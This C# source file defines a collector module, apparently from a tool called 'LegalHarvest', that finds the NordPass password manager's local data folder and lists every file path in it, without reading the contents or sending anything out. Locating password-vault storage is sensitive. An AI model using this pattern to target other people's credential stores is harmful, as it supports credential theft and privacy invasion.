using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class NordPassModule : ICollectorModule
    {
        public string ModuleName => "NordPass";
        public bool CanExecute()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordPass");
            return Directory.Exists(path);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string nordPassDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordPass");
            if (Directory.Exists(nordPassDir))
                foreach (string file in Directory.GetFiles(nordPassDir, "*", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "NordPass", Name = file, Value = file, Timestamp = DateTime.Now });
            return items;
        }
    }
}
